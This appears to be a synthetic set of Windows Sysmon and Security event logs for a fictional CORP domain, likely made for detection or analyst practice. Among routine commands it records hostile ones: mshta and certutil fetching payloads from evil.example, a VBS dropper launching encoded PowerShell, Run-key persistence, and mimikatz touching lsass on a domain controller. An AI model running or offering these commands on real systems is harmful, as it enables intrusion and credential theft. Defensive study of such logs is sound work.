<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:02:00.0000000Z" />
    <EventRecordID>2</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS02</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:02:00.000</Data>
    <Data Name="ProcessGuid">{ee98d201-c30e-4bcd-98c8-3a8419c97a56}</Data>
    <Data Name="ProcessId">10002</Data>
    <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
    <Data Name="CommandLine">wscript.exe invoice.vbs</Data>
    <Data Name="CurrentDirectory">C:\Users\ksmith\Downloads\</Data>
    <Data Name="User">CORP\ksmith</Data>
    <Data Name="ParentProcessGuid">{f335b208-1c24-44ce-94c7-1c8003c4c1a8}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:03:00.0000000Z" />
    <EventRecordID>3</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS03</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:03:00.000</Data>
    <Data Name="ProcessGuid">{57a1fc22-69fb-4fc1-b22f-809507d0f158}</Data>
    <Data Name="ProcessId">10003</Data>
    <Data Name="Image">C:\Windows\System32\cscript.exe</Data>
    <Data Name="CommandLine">cscript.exe //B report.vbs</Data>
    <Data Name="CurrentDirectory">C:\Users\mwilson\</Data>
    <Data Name="User">CORP\mwilson</Data>
    <Data Name="ParentProcessGuid">{57a0744e-fc26-45dd-a254-afa7522e693d}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:04:00.0000000Z" />
    <EventRecordID>4</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS04</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:04:00.000</Data>
    <Data Name="ProcessGuid">{c6c60061-c4f3-4cac-9699-6e0a3c1abcb0}</Data>
    <Data Name="ProcessId">10004</Data>
    <Data Name="Image">C:\Windows\System32\mshta.exe</Data>
    <Data Name="CommandLine">mshta.exe http://evil.example/payload.hta</Data>
    <Data Name="CurrentDirectory">C:\Users\tlee\Downloads\</Data>
    <Data Name="User">CORP\tlee</Data>
    <Data Name="ParentProcessGuid">{9682ee1c-e224-49d8-a7cb-7658befec350}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:05:00.0000000Z" />
    <EventRecordID>5</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS05</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:05:00.000</Data>
    <Data Name="ProcessGuid">{40df06f4-7674-460a-b6f8-f792dd6dec8d}</Data>
    <Data Name="ProcessId">10005</Data>
    <Data Name="Image">C:\Users\pgomez\AppData\Local\Temp\loader.vbs.exe</Data>
    <Data Name="CommandLine">wscript.exe //E:vbscript loader.vbs</Data>
    <Data Name="CurrentDirectory">C:\Users\pgomez\AppData\Local\Temp\</Data>
    <Data Name="User">CORP\pgomez</Data>
    <Data Name="ParentProcessGuid">{750fda18-4838-4081-930b-f30e72e5b453}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:06:00.0000000Z" />
    <EventRecordID>6</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS06</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:06:00.000</Data>
    <Data Name="ProcessGuid">{cf7b4495-7a9a-4edd-9170-4144cd3a2685}</Data>
    <Data Name="ProcessId">10006</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c certutil.exe -urlcache -f http://evil.example/tool.exe out.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\swhite\</Data>
    <Data Name="User">CORP\swhite</Data>
    <Data Name="ParentProcessGuid">{997cc1e4-f57c-4b6d-95a0-c03774b67efd}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:06:03.0000000Z" />
    <EventRecordID>7</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS06</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:06:03.000</Data>
    <Data Name="ProcessGuid">{0aab26b9-3c65-478f-ba01-bb711700ee48}</Data>
    <Data Name="ProcessId">10007</Data>
    <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
    <Data Name="CommandLine">certutil.exe -urlcache -f http://evil.example/tool.exe out.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\swhite\</Data>
    <Data Name="User">CORP\swhite</Data>
    <Data Name="ParentProcessGuid">{cf7b4495-7a9a-4edd-9170-4144cd3a2685}</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe /c certutil.exe ...</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:07:03.0000000Z" />
    <EventRecordID>8</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS07</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:07:03.000</Data>
    <Data Name="ProcessGuid">{9775c1e0-d36e-4b78-8efd-1be9b8c5a6c3}</Data>
    <Data Name="ProcessId">10008</Data>
    <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
    <Data Name="CommandLine">wscript.exe dropper.vbs</Data>
    <Data Name="CurrentDirectory">C:\Users\bwong\Downloads\</Data>
    <Data Name="User">CORP\bwong</Data>
    <Data Name="ParentProcessGuid">{c85982a0-571b-4043-84d5-19c0839d788d}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:07:07.0000000Z" />
    <EventRecordID>9</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS07</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:07:07.000</Data>
    <Data Name="ProcessGuid">{f6047841-27ab-4ca6-b1a5-9d57d5a5ca07}</Data>
    <Data Name="ProcessId">10009</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell -enc SQBFAFgA...</Data>
    <Data Name="CurrentDirectory">C:\Users\bwong\Downloads\</Data>
    <Data Name="User">CORP\bwong</Data>
    <Data Name="ParentProcessGuid">{9775c1e0-d36e-4b78-8efd-1be9b8c5a6c3}</Data>
    <Data Name="ParentImage">C:\Windows\System32\wscript.exe</Data>
    <Data Name="ParentCommandLine">wscript.exe dropper.vbs</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:08:07.0000000Z" />
    <EventRecordID>10</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS08</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:08:07.000</Data>
    <Data Name="ProcessGuid">{38449821-e89e-49ff-8a85-d8f33b56ddb8}</Data>
    <Data Name="ProcessId">10010</Data>
    <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
    <Data Name="CommandLine">wscript.exe installer.vbs</Data>
    <Data Name="CurrentDirectory">C:\Users\cchen\Downloads\</Data>
    <Data Name="User">CORP\cchen</Data>
    <Data Name="ParentProcessGuid">{8c96cb23-d3e9-4696-b93f-3badb9e37fe3}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>13</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:08:13.0000000Z" />
    <EventRecordID>11</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS08</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:08:13.000</Data>
    <Data Name="ProcessGuid">{38449821-e89e-49ff-8a85-d8f33b56ddb8}</Data>
    <Data Name="Image">C:\Windows\System32\wscript.exe</Data>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKU\S-1-5-21-111-222-333-1002\Software\Microsoft\Windows\CurrentVersion\Run\SystemHelper</Data>
    <Data Name="Details">C:\Users\cchen\AppData\Local\Temp\helper.exe</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:09:13.0000000Z" />
    <EventRecordID>12</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:09:13.000</Data>
    <Data Name="ProcessGuid">{2a5a426f-299b-41b0-9ce3-026622f36423}</Data>
    <Data Name="ProcessId">10012</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c mimikatz.exe</Data>
    <Data Name="CurrentDirectory">C:\Windows\Temp\</Data>
    <Data Name="User">CORP\dking</Data>
    <Data Name="ParentProcessGuid">{963f8b4a-d651-47ff-9c03-72b74b4f6397}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>10</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:09:18.0000000Z" />
    <EventRecordID>13</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:09:18.000</Data>
    <Data Name="SourceProcessGUID">{2a5a426f-299b-41b0-9ce3-026622f36423}</Data>
    <Data Name="SourceProcessId">12876</Data>
    <Data Name="SourceThreadId">23480</Data>
    <Data Name="SourceImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="TargetProcessGUID">{fd589197-3a3e-4339-aa5b-c933c1d3d03c}</Data>
    <Data Name="TargetProcessId">988</Data>
    <Data Name="TargetImage">C:\Windows\System32\lsass.exe</Data>
    <Data Name="GrantedAccess">0x1fffff</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9d8e4|...</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:10:18.0000000Z" />
    <EventRecordID>14</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS09</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:10:18.000</Data>
    <Data Name="ProcessGuid">{6e428b9f-4f00-437b-b8ce-e62e123cb6d6}</Data>
    <Data Name="ProcessId">10014</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c net use \\WIN-SRV05\C$</Data>
    <Data Name="CurrentDirectory">C:\Users\emartin\</Data>
    <Data Name="User">CORP\emartin</Data>
    <Data Name="ParentProcessGuid">{096053c3-1c0b-4338-a471-0ae8b111388e}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4624</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:12:18.0000000Z" />
    <EventRecordID>15</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Security</Channel>
    <Computer>WIN-SRV05</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="TargetUserName">emartin</Data>
    <Data Name="IpAddress">192.168.1.60</Data>
    <Data Name="LogonType">3</Data>
    <Data Name="LogonProcessName">NtLmSsp</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:14:18.0000000Z" />
    <EventRecordID>16</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS10</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:14:18.000</Data>
    <Data Name="ProcessGuid">{c612ae4b-9e89-40be-82a4-ad716d0b6e2c}</Data>
    <Data Name="ProcessId">10016</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c dir</Data>
    <Data Name="CurrentDirectory">C:\Users\fowen\</Data>
    <Data Name="User">CORP\fowen</Data>
    <Data Name="ParentProcessGuid">{da08c355-1b23-4f55-9a6a-6fc286be3056}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:15:18.0000000Z" />
    <EventRecordID>17</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS11</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:15:18.000</Data>
    <Data Name="ProcessGuid">{ea866629-8f62-4945-8137-412b340f93c6}</Data>
    <Data Name="ProcessId">10017</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c ipconfig</Data>
    <Data Name="CurrentDirectory">C:\Users\gtan\</Data>
    <Data Name="User">CORP\gtan</Data>
    <Data Name="ParentProcessGuid">{f93f904a-65a5-4693-8bb7-f6f43295de50}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>4624</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:16:18.0000000Z" />
    <EventRecordID>18</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Security</Channel>
    <Computer>WIN-WKS11</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="TargetUserName">gtan</Data>
    <Data Name="IpAddress">-</Data>
    <Data Name="LogonType">2</Data>
    <Data Name="LogonProcessName">NtLmSsp</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:17:18.0000000Z" />
    <EventRecordID>19</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS12</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:17:18.000</Data>
    <Data Name="ProcessGuid">{523e429f-e635-45f3-84d4-a5bf95fc5cd2}</Data>
    <Data Name="ProcessId">10019</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c tasklist</Data>
    <Data Name="CurrentDirectory">C:\Users\hross\</Data>
    <Data Name="User">CORP\hross</Data>
    <Data Name="ParentProcessGuid">{e1fc571d-ac1e-45e9-aa18-28b7ee452c39}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>10</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:17:23.0000000Z" />
    <EventRecordID>20</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS12</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:17:23.000</Data>
    <Data Name="SourceProcessGUID">{523e429f-e635-45f3-84d4-a5bf95fc5cd2}</Data>
    <Data Name="SourceProcessId">12876</Data>
    <Data Name="SourceThreadId">23480</Data>
    <Data Name="SourceImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="TargetProcessGUID">{62f53079-af47-4d2c-97f8-ec4317d55a84}</Data>
    <Data Name="TargetProcessId">988</Data>
    <Data Name="TargetImage">C:\Windows\System32\notepad.exe</Data>
    <Data Name="GrantedAccess">0x1000</Data>
    <Data Name="CallTrace">C:\Windows\SYSTEM32\ntdll.dll+9d8e4|...</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>13</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-17T11:18:23.0000000Z" />
    <EventRecordID>21</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-17 11:18:23.000</Data>
    <Data Name="ProcessGuid">{9988e76b-4e8c-4ca1-a25a-5a47d7818a02}</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="EventType">SetValue</Data>
    <Data Name="TargetObject">HKLM\SYSTEM\CurrentControlSet\Services\SomeService\Start</Data>
    <Data Name="Details">2</Data>
  </EventData>
</Event>
</Events>